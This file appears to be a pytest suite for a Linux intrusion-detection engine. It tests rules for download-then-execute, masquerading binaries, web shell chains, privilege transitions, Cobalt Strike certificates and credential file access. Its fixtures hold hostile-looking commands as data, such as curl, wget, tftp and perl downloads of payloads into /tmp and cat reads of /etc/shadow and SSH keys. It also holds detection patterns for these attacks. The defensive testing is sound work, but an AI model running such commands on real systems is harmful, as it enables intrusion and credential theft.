"""Typed Linux observations, sequence lanes and mission-scale disk joins."""
from datetime import timedelta

import pytest

from romulus.detect.registry import ALL_PLAYBOOKS
from tests.test_bounded_host import T0, ev


def staged_run(cls, parts, tmp_path):
    detector, stage = cls(), {}
    detector.spill_dir = tmp_path
    for part in parts:
        assert detector.consume(part) == []
        stage.update({e.id: e for e in detector.drain_staged()})
    detector.bind_loader(lambda ids: [stage[i] for i in ids if i in stage])
    return detector, list(detector.finalize())


def rule(name):
    return next(cls for cls in ALL_PLAYBOOKS if cls.id == name)


def ex(t=0, path="/tmp/payload", host="web1", user="alice", **fields):
    return ev("process_exec", T0 + timedelta(seconds=t), host_name=host,
              process__executable=path, process__argv=[path], process__user=user,
              process__uid="1000", process__pid=42, process__ppid=1, **fields)


def change(t=0, path="/tmp/payload", kind="create", user="alice", **fields):
    return ev("file_change", T0 + timedelta(seconds=t), file__path=path, file__change=kind,
              process__user=user, process__uid="1000", **fields)


def downloader(path="/tmp/payload", host="web1"):
    e = ex(path="/usr/bin/curl", host=host, process__cwd="/tmp")
    e.fields["process.argv"].value = ["curl", "https://download.invalid/tool", "-o", path]
    return e


def test_registered_linux_rules():
    expected = {"host.download_then_execute", "host.authorized_key_then_login", "host.masquerading_binary",
                "host.tool_cleanup", "host.kernel_module_load", "host.web_shell_chain", "host.discovery_burst",
                "host.unbrokered_privilege_transition", "host.interactive_privileged_login",
                "net.outbound_ssh_external", "host.telemetry_gap_after_tamper", "corr.alert_then_host_execution",
                "host.credential_material_access", "net.c2_default_certificate"}
    assert expected <= {c.id for c in ALL_PLAYBOOKS}


@pytest.mark.parametrize("path,lane", [("/tmp/sshd", "high"), ("/opt/sshd1", "lead"),
    ("/usr/sbin/sshd", None), ("/usr/bin/su", None), ("/tmp/ordinary", None),
    ("/var/lib/docker/overlay2/abc/merged/usr/sbin/sshd", None),
    ("/var/lib/containers/storage/overlay/abc/merged/bin/bash", None)])
def test_masquerade(path, lane):
    out = rule("host.masquerading_binary")().consume([ex(path=path)])
    assert [m.proposed_lane for m in out] == ([lane] if lane else [])


def test_kernel_thread_comm():
    assert rule("host.masquerading_binary")().consume([ex(process__comm="[kworker/0:1]")])[0].proposed_lane == "high"


@pytest.mark.parametrize("path,user,lane", [("/tmp/m.ko", "alice", "high"),
    ("/lib/modules/m.ko", "www-data", "high"), ("/lib/modules/m.ko", "root", "context")])
def test_module_load_lanes(path, user, lane):
    e = ev("kernel_module", T0, module__op="load", module__path=path, process__user=user)
    assert rule("host.kernel_module_load")().consume([e])[0].proposed_lane == lane


@pytest.mark.parametrize("path,user,owner,lane", [("/etc/shadow", "alice", "root", "high"),
    ("/home/alice/.ssh/id_ed25519", "alice", "alice", "lead"),
    ("/home/bob/.ssh/id_rsa", "alice", "bob", "high"), ("/proc/123/environ", "alice", None, "lead"),
    ("/home/alice/.vault-token", "alice", None, "lead"),
    ("/var/lib/jenkins/credentials.xml", "jenkins", None, "lead"),
    ("/var/lib/jenkins/credentials.xml", "alice", None, "lead"), ("/etc/passwd", "alice", None, None)])
def test_credentials(path, user, owner, lane):
    e = ex(path="/usr/bin/cat", user=user, file__owner__name=owner)
    e.fields["process.argv"].value = ["cat", path]
    out = rule("host.credential_material_access")().consume([e])
    assert [m.proposed_lane for m in out] == ([lane] if lane else [])


@pytest.mark.parametrize("path,user,lane", [("/tmp/payload", "alice", "high"),
    ("/opt/tool", "alice", "lead"), ("/opt/tool", "www-data", "high")])
def test_download_late_arrival(path, user, lane, tmp_path):
    d, x, a = downloader(path), ex(20, path, user=user), change(10, path, "attributes")
    _, out = staged_run(rule("host.download_then_execute"), [[x], [a], [d]], tmp_path)
    assert len(out) == 1 and out[0].proposed_lane == lane
    assert {e.id for e in out[0].events} == {d.id, x.id, a.id}
    assert "inferred" in out[0].claim.lower()


@pytest.mark.parametrize("own,lane", [(True, "lead"), (False, "high")])
def test_authorized_key_late_login(own, lane, tmp_path):
    w = change(path="/home/alice/.ssh/authorized_keys", file__owner__id="1000" if own else "2000")
    a = ev("auth", T0 + timedelta(days=6), auth__service="sshd", auth__phase="authentication",
           auth__method="publickey", user__name="alice", source__ip="203.0.113.2")
    _, out = staged_run(rule("host.authorized_key_then_login"), [[a], [w]], tmp_path)
    assert len(out) == 1 and out[0].proposed_lane == lane and "inferred" in out[0].claim.lower()


@pytest.mark.parametrize("created,path,lane", [(True, "/tmp/payload", "high"),
    (False, "/tmp/payload", "lead"), (True, "/opt/payload", "lead"),
    (True, "/var/lib/dpkg/tmp.ci/payload", None)])
def test_cleanup(created, path, lane, tmp_path):
    events = [ex(10, path), change(20, path, "delete")]
    if created:
        events += [change(0, path)]
    _, out = staged_run(rule("host.tool_cleanup"), [[e] for e in reversed(events)], tmp_path)
    assert [m.proposed_lane for m in out] == ([lane] if lane else [])


@pytest.mark.parametrize("requested,status,execution,lane", [(False, 200, False, "lead"),
    (True, 200, False, "high"), (True, 404, False, "lead"), (True, 200, True, "urgent")])
def test_web_chain(requested, status, execution, lane, tmp_path):
    events = [change(path="/var/www/html/upload.php", user="www-data")]
    if requested:
        events += [ev("http_access", T0 + timedelta(seconds=20), host_name="web1",
                      url__path="/uploads/upload.php", http__response__status_code=status)]
    if execution:
        events += [ex(30, "/bin/bash", user="www-data")]
    _, out = staged_run(rule("host.web_shell_chain"), [[e] for e in reversed(events)], tmp_path)
    assert len(out) == 1 and out[0].proposed_lane == lane
    if requested:
        assert "inferred" in out[0].claim.lower()


@pytest.mark.parametrize("user,lane", [("alice", "lead"), ("www-data", "high")])
def test_discovery(user, lane, tmp_path):
    events = [ex(i, f"/usr/bin/{n}", user=user, process__auid="1000", process__session_id=9)
              for i, n in enumerate(["whoami", "uname", "ss", "ps", "tree"])]
    _, out = staged_run(rule("host.discovery_burst"), [[e] for e in reversed(events)], tmp_path)
    assert len(out) == 1 and out[0].proposed_lane == lane


@pytest.mark.parametrize("parent,lane", [(None, "lead"), ("/tmp/exploit", "high"), ("/usr/bin/sudo", None)])
def test_privilege_chain(parent, lane, tmp_path):
    c = ex(10, "/bin/bash", process__auid="1000", process__euid="0")
    c.fields["process.ppid"].value = 41
    events = [c]
    if parent:
        p = ex(path=parent)
        p.fields["process.pid"].value = 41
        events += [p]
    _, out = staged_run(rule("host.unbrokered_privilege_transition"), [[e] for e in events], tmp_path)
    assert [m.proposed_lane for m in out] == ([lane] if lane else [])


def test_many_hosts_disk_bounds(tmp_path):
    parts = [[downloader(host=f"h{i}"), ex(20, host=f"h{i}")] for i in range(2500)]
    detector, out = staged_run(rule("host.download_then_execute"), parts, tmp_path)
    assert len(out) == 2500 and detector.evaluated == 5000 and detector.capped == 0
    assert detector.pending_count == 0 and detector.rows_on_disk >= 5000
    assert detector.retained_events() == []

# Additional rules use the same staged runner, including honest index-gap facts.
@pytest.mark.parametrize("user,uid,source,management,lane", [
    ("www-data", "33", "8.8.8.8", (), "high"),
    ("daemon", "1", "8.8.8.8", (), "high"),
    ("root", "0", "8.8.8.8", (), "lead"),
    ("root", "0", "10.0.0.2", ("10.0.0.2",), "context"),
    ("alice", "1000", "8.8.8.8", (), None)])
def test_interactive_login_lanes(user, uid, source, management, lane, tmp_path):
    from dataclasses import replace

    from romulus.site import absent_site_facts
    cls = rule("host.interactive_privileged_login")
    detector = cls()
    detector.site_facts = replace(absent_site_facts(), management_hosts=management)
    detector.spill_dir = tmp_path
    e = ev("auth", T0, auth__service="sshd", auth__phase="authentication",
           user__name=user, user__id=uid, source__ip=source)
    detector.consume([e])
    stage = {event.id: event for event in detector.drain_staged()}
    detector.bind_loader(lambda ids: [stage[i] for i in ids])
    assert [m.proposed_lane for m in detector.finalize()] == ([lane] if lane else [])


@pytest.mark.parametrize("source,destination,port,management,lane", [
    ("10.0.0.2", "8.8.8.8", 22, (), "lead"),
    ("10.0.0.2", "8.8.8.8", 22, ("10.0.0.2",), "context"),
    ("8.8.8.8", "10.0.0.2", 22, (), None),
    ("10.0.0.2", "10.0.0.3", 22, (), None),
    ("10.0.0.2", "8.8.8.8", 443, (), None)])
def test_outbound_ssh_lanes(source, destination, port, management, lane, tmp_path):
    from dataclasses import replace

    from romulus.site import absent_site_facts
    detector = rule("net.outbound_ssh_external")()
    detector.spill_dir = tmp_path
    detector.site_facts = replace(absent_site_facts(), management_hosts=management)
    e = ev("net_flow", T0, source__ip=source, destination__ip=destination,
           source__port=54321, destination__port=port, network__transport="tcp")
    detector.consume([e])
    stage = {event.id: event for event in detector.drain_staged()}
    detector.bind_loader(lambda ids: [stage[i] for i in ids])
    assert [m.proposed_lane for m in detector.finalize()] == ([lane] if lane else [])


@pytest.mark.parametrize("name,expected", [("Major Cobalt Strike", True), ("major cobalt strike", True),
                                           ("Major Cobalt Strike.example", False), ("ordinary", False)])
def test_certificate_exact_name(name, expected):
    e = ev("tls_session", T0, tls__server__certificates=[{"subject_cn": [name], "issuer_cn": []}])
    assert bool(rule("net.c2_default_certificate")().consume([e])) is expected


@pytest.mark.parametrize("web_user,listener,host_address,expected", [
    (True, False, True, "high"), (False, True, True, "high"), (False, False, True, None),
    (True, False, False, None)])
def test_alert_host_execution(web_user, listener, host_address, expected, tmp_path):
    alert = ev("net_alert", T0, host_name="sensor", source__ip="8.8.8.8", destination__ip="10.0.0.9",
               destination__port=80, alert__severity=1)
    child = ex(10, "/usr/bin/worker", user="www-data" if web_user else "alice")
    if host_address:
        from romulus.evidence.typed import fv
        child.fields["host.ip"] = fv(["10.0.0.9"], "typed:host.ip")
    child.fields["process.ppid"].value = 40
    events = [child, alert]
    if listener:
        events.append(ev("net_socket", T0 - timedelta(days=1), host_name="web1",
                         socket__syscall="bind", socket__local__ip="0.0.0.0", socket__local__port=80,
                         process__pid=40))
    detector, out = staged_run(rule("corr.alert_then_host_execution"), [[e] for e in events], tmp_path)
    assert [m.proposed_lane for m in out] == ([expected] if expected else [])
    if not host_address:
        assert any("mapping" in note for note in detector.coverage_notes())
    if out:
        assert "inferred" in out[0].claim.lower() and {alert.id, child.id} <= {e.id for e in out[0].events}


def test_gap_uses_existing_published_tamper_and_continued_other_family(tmp_path):
    from romulus.detect.base import Match
    detector = rule("host.telemetry_gap_after_tamper")()
    detector.spill_dir = tmp_path
    tamper = ev("audit_config", T0, audit__serial=1, audit__config__op="remove_rule")
    continued = ev("auth", T0 + timedelta(minutes=20), journal__identifier="sshd")
    detector.consume([continued, tamper])
    stage = {e.id: e for e in detector.drain_staged()}
    detector.bind_loader(lambda ids: [stage[i] for i in ids])
    # A typed request alone is insufficient: only a finding actually emitted by a tamper rule triggers the join.
    assert list(detector.finalize()) == []
    detector.observe_tamper_match(Match("host.audit_rules_tamper", "recorded tamper", "observed_action",
        [tamper], [], T0, "high", "high", "high"))
    detector.drain_staged()
    [match] = list(detector.finalize())
    assert match.proposed_lane == "lead" and "No auditd records" in match.claim
    assert "host activity or its absence is not established" in match.claim
    assert "ends inside the gap" in match.claim
    detector.consume([ev("process_observed", T0 + timedelta(minutes=5), audit__serial=2)])
    detector.drain_staged()
    assert list(detector.finalize()) == []


def test_download_write_arm_cites_download_write_and_exec(tmp_path):
    d = downloader()
    d.fields["process.argv"].value = ["curl", "https://download.invalid/tool"]
    w = change(3, process__pid=42)
    x = ex(10)
    _, out = staged_run(rule("host.download_then_execute"), [[x], [w], [d]], tmp_path)
    assert len(out) == 1 and {d.id, w.id, x.id} <= {e.id for e in out[0].events}


@pytest.mark.parametrize("before,after", [
    (downloader(), ex(-1)),
    (downloader(), ex(3700)),
    (downloader(), ex(20, "/tmp/unrelated")),
])
def test_download_order_window_and_path_negatives(before, after, tmp_path):
    _, out = staged_run(rule("host.download_then_execute"), [[after], [before]], tmp_path)
    assert not out


def test_watch_arm_can_assure_only_explicit_watched_read_negatives():
    cls = rule("host.credential_material_access")
    detector = cls()
    watched = ev("file_access", T0, file__path="/etc/ordinary", file__access="read", audit__key="watched")
    assert detector.assures_negative_for([watched])
    assert not detector.assures_negative_for([ex()])
    assert not detector.assures_negative_for([ev("file_access", T0, file__path="/etc/ordinary")])


def test_actual_disk_refusal_names_partial_without_dropping_accepted_join(tmp_path):
    detector = rule("host.download_then_execute")()
    detector.spill_dir = tmp_path
    d, x = downloader(), ex(10)
    detector.consume([d, x])
    stage = {e.id: e for e in detector.drain_staged()}
    detector.state_budget().force_full("test physical byte ceiling", lambda account: account is detector.account())
    detector.consume([downloader(host="other")])
    detector.bind_loader(lambda ids: [stage[i] for i in ids])
    assert detector.capped == 1
    assert any("disk budget" in text for text in detector.limit_reasons())
    assert len(list(detector.finalize())) == 1


def test_python_dictionary_get_is_not_a_downloader(tmp_path):
    e = ex(path="/usr/bin/python3")
    e.fields["process.argv"].value = ["python3", "-c", "d={}; d.get('https://example.invalid/tool')"]
    _, out = staged_run(rule("host.download_then_execute"), [[e, change(3, process__pid=42), ex(10)]], tmp_path)
    assert not out


@pytest.mark.parametrize("argv", [
    ["curl", "--help", "-o", "/tmp/payload"],
    ["curl", "-o", "/tmp/payload"],
    ["wget", "-O", "/tmp/payload"],
])
def test_downloader_requires_a_positive_transfer_operand(argv, tmp_path):
    e = downloader()
    e.fields["process.executable"].value = "/usr/bin/" + argv[0]
    e.fields["process.argv"].value = argv
    _, out = staged_run(rule("host.download_then_execute"), [[e, ex(10)]], tmp_path)
    assert not out


def test_uid_root_with_nonroot_effective_id_is_not_an_effective_root_transition(tmp_path):
    e = ex(process__euid="1000", process__auid="1000")
    e.fields["process.uid"].value = "0"
    _, out = staged_run(rule("host.unbrokered_privilege_transition"), [[e]], tmp_path)
    assert not out


@pytest.mark.parametrize("script", [
    "import urllib.request; urllib.request.urlretrieve('https://example.invalid/x','/tmp/payload')",
    "from urllib.request import urlretrieve as get; get('https://example.invalid/x','/tmp/payload')",
    "import requests as r; r.get('https://example.invalid/x')",
])
def test_python_downloader_literal_and_watched_file_arm(script, tmp_path):
    e = ex(path="/usr/bin/python3")
    e.fields["process.argv"].value = ["python3", "-c", script]
    _, out = staged_run(rule("host.download_then_execute"), [[ex(10)], [change(3, process__pid=42)], [e]], tmp_path)
    assert len(out) == 1


def test_new_audit_families_without_auditing_are_unresolved():
    for name in ("host.kernel_module_load", "host.credential_material_access"):
        detector = rule(name)()
        detector.consume([ex(path="/usr/bin/ordinary")])
        assert detector.partition_coverage_notes()
        assert "unresolved" in detector.partition_coverage_notes()[0]


@pytest.mark.parametrize("name", [
    "host.download_then_execute", "host.authorized_key_then_login", "host.tool_cleanup", "host.web_shell_chain",
    "host.discovery_burst", "host.unbrokered_privilege_transition", "host.interactive_privileged_login",
    "net.outbound_ssh_external", "corr.alert_then_host_execution", "host.telemetry_gap_after_tamper"])
def test_each_sequence_retains_many_hosts_on_disk_and_streams_exact_groups(name, tmp_path):
    from romulus.detect.base import Match
    from romulus.evidence.typed import fv
    detector, stage = rule(name)(), {}
    detector.spill_dir = tmp_path
    for i in range(1000):
        host = f"host{i}"
        if name == "host.download_then_execute":
            events = [downloader(host=host), ex(10, host=host)]
        elif name == "host.authorized_key_then_login":
            events = [change(path="/home/alice/.ssh/authorized_keys"),
                      ev("auth", T0 + timedelta(seconds=10), auth__method="publickey", auth__service="sshd",
                         auth__phase="authentication", user__name="alice")]
        elif name == "host.tool_cleanup":
            events = [change(), ex(10), change(20, kind="delete")]
        elif name == "host.web_shell_chain":
            events = [change(path="/var/www/a.php", user="www-data"),
                      ev("http_access", T0 + timedelta(seconds=10), url__path="/a.php")]
        elif name == "host.discovery_burst":
            events = [ex(n, f"/usr/bin/{command}", process__auid="1000", process__session_id=9)
                      for n, command in enumerate(("whoami", "uname", "ss", "ps", "tree"))]
        elif name == "host.unbrokered_privilege_transition":
            events = [ex(process__euid="0", process__auid="1000")]
        elif name == "host.interactive_privileged_login":
            events = [ev("auth", T0, auth__service="sshd", auth__phase="authentication",
                         user__name="root", source__ip="8.8.8.8")]
        elif name == "net.outbound_ssh_external":
            events = [ev("net_flow", T0, source__ip=f"10.4.{i // 256}.{i % 256}",
                         destination__ip="8.8.8.8", destination__port=22, network__transport="tcp")]
        elif name == "corr.alert_then_host_execution":
            ip = f"10.3.{i // 256}.{i % 256}"
            events = [ev("net_alert", T0, destination__ip=ip, alert__severity=1),
                      ex(10, "/usr/bin/worker", user="www-data")]
            events[1].fields["host.ip"] = fv([ip], "typed:host.ip")
        else:
            events = [ev("audit_config", T0, audit__serial=1, audit__config__op="remove_rule"),
                      ev("auth", T0 + timedelta(minutes=20), journal__identifier="sshd")]
        for event in events:
            event.host = host
        detector.consume(list(reversed(events)))
        if name == "host.telemetry_gap_after_tamper":
            detector.observe_tamper_match(Match("host.audit_rules_tamper", "tamper", "observed_action",
                events[:1], [], T0, "high", "high", "high"))
        stage.update({event.id: event for event in detector.drain_staged()})
        assert detector.pending_count == 0
        assert all(len(buffer) <= 5000 for _, buffer in detector.spill()._buffers.values())
    detector.bind_loader(lambda ids: [stage[i] for i in ids])
    result = detector.finalize()
    assert not isinstance(result, list)
    assert sum(1 for _ in result) == 1000
    assert detector.rows_on_disk >= 1000 and detector.capped == 0
    assert detector.retained_events() == []


def test_explicit_wget_output_does_not_add_the_url_basename(tmp_path):
    e = downloader()
    e.fields["process.executable"].value = "/usr/bin/wget"
    e.fields["process.argv"].value = ["wget", "https://example.invalid/payload", "-O", "/opt/other"]
    _, out = staged_run(rule("host.download_then_execute"), [[e, ex(10)]], tmp_path)
    assert not out


@pytest.mark.parametrize("argv", [
    ["curl", "-O", "https://example.invalid/payload"],
    ["wget", "-P", "/tmp", "https://example.invalid/payload"],
    ["fetch", "-o", "/tmp/payload", "https://example.invalid/file"],
    ["scp", "source:/remote/payload", "/tmp/"],
    ["tftp", "server", "-c", "get", "remote", "/tmp/payload"],
    ["ftp", "-o", "/tmp/payload", "https://example.invalid/file"],
    ["perl", "-MLWP::Simple", "-e", "getstore('https://example.invalid/file','/tmp/payload')"],
])
def test_documented_downloader_grammars(argv, tmp_path):
    e = downloader()
    e.fields["process.executable"].value = "/usr/bin/" + argv[0]
    e.fields["process.argv"].value = argv
    _, out = staged_run(rule("host.download_then_execute"),
                        [[ex(10)], [change(3, process__pid=42)], [e]], tmp_path)
    assert len(out) == 1


@pytest.mark.parametrize("path,executable,user,expected", [
    ("/etc/shadow", "/usr/sbin/sshd", "root", False),
    ("/etc/shadow", "/tmp/sshd", "root", True),
    ("/etc/shadow", "/usr/bin/cat", "root", True),
    ("/etc/ssh/ssh_host_ed25519_key", "/usr/sbin/sshd", "root", False),
    ("/var/lib/jenkins/credentials.xml", "/usr/bin/java", "jenkins", False),
])
def test_credential_owning_daemons_are_narrow_typed_exclusions(path, executable, user, expected):
    e = ev("file_access", T0, file__path=path, file__access="read", audit__key="watched",
           process__executable=executable, process__user=user)
    assert bool(rule("host.credential_material_access")().consume([e])) is expected
